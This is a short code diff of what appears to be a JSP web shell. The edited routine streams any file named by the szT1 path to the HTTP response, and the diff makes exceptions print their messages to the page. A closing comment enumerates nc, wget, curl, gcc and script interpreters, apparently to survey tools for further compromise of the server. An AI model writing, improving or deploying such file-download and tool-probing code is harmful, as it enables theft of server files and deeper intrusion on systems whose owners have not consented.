@@ -21,15 +21,16 @@ if(null != szT1)
             FileInputStream in = new FileInputStream(szT1);
             int nX = 0;
             byte []ab = new byte[4096];
+            OutputStream outstr = response.getOutputStream();
             while(-1 < (nX = in.read(ab, 0, 4096)))
             {
-                out.write(ab,0,nX);
+                outstr.write(ab,0,nX);
             }
-            out.flush();
-            out.close();
+            outstr.flush();
+            outstr.close();
         }
         return;
-    }catch(Exception e){}
+    }catch(Exception e){out.println(e.getMessage());}
 }
 
 // which gcc nc wget curl perl python java ruby awk php
